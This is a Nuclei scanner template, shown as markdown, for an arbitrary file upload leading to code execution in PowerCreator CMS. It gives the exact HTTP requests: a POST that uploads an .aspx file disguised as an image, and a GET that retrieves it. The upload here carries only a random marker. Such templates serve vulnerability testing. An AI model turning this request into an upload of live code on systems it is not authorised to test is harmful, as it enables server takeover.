# Nuclei Template: PowerCreator CMS - Remote Code Execution
**Template ID:** powercreator-cms-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`powercreator-cms-rce.yaml`)

## Vulnerability Information & PoC

## Description
PowerCreator CMS is susceptible to a remote code execution vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1
Host: {{Hostname}}
Content-Disposition: form-data;name="file1";filename="poc.aspx";
Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136

-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file1"; filename="poc.aspx"
Content-Type: image/jpeg

{{randstr}}
-----------------------------20873900192357278038549710136--

GET /ResourcePic/{{endpoint}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/PowerCreatorCms/PowerCreatorCms%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0/
